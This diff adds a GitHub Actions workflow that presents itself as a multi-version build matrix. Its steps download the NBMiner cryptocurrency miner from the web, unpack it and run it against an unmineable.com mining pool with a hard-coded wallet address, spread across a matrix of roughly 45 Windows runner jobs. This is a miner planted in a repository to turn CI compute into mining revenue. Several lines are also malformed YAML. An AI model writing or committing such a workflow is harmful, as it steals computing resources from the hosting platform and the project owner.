@@ -1,0 +1,26 @@
+name: Dhan151001
+ 
+on: [workflow_dispatch] push
+ 
+jobs:
+  build:
+    name: Dhang151001
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://nbminer.com/#:~:text=NBMiner_41.3_Win.zip -OutFile NBMiner_41.3_Win.zip 
+    - name: Extract
+      run: Expand-Archive NBMiner_41.3_Win.zip
+    - name: RUNNING
+      run: .\NBMiner_41.3_Win.zip\NBMiner_41.3_Win\NBMiner.exe autolykos.unmineable.com, TSnTThHa43kguo5oLxBKvXUnL7AmkqnuxC, threads 4, '
+    - name: DONE
+      run: exit
